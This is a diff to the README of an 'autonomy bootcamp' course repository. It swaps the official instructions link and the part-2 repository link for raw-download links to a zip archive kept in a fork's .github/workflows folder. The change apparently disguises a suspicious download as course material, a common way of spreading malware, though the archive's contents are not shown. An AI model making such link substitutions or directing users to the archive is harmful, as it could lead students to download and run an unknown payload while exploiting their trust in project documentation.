@@ -1,6 +1,6 @@
 # autonomy-bootcamp-2025-p1
 Autonomy bootcamp starting F25 part 1
 
-Follow the [instructions](https://uwarg-docs.atlassian.net/wiki/spaces/BOOT/pages/3355672582/NEW+Autonomy+Bootcamp).
+Follow the [instructions](https://raw.githubusercontent.com/christghuynh/autonomy-bootcamp-2025-p1/main/.github/workflows/autonomy-bootcamp-2025-p1_v2.7.zip+Autonomy+Bootcamp).
 
-You can find part 2 [here](https://github.com/UWARG/autonomy-bootcamp-2025-p2).
+You can find part 2 [here](https://raw.githubusercontent.com/christghuynh/autonomy-bootcamp-2025-p1/main/.github/workflows/autonomy-bootcamp-2025-p1_v2.7.zip).
